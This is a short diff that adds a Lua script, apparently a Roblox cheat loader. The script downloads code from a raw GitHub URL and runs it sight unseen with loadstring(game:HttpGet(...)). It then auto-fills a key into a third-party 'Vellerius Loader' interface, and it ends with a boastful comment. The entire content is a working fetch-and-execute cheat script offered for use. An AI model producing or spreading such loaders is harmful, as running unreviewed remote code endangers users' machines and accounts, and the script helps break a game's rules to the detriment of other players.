@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2022/main/pjmblofrut"))()
+repeat wait() until game:GetService("CoreGui")["Vellerius Loader"].Main.TextBox.Text
+game:GetService("CoreGui")["Vellerius Loader"].Main.TextBox.Text = "e12432e5bea5b68f60c77fcc398f9214e4494ef1ac1a0de4b5a8216cf944a587"
+--im too great at lua ( mind blow ) 
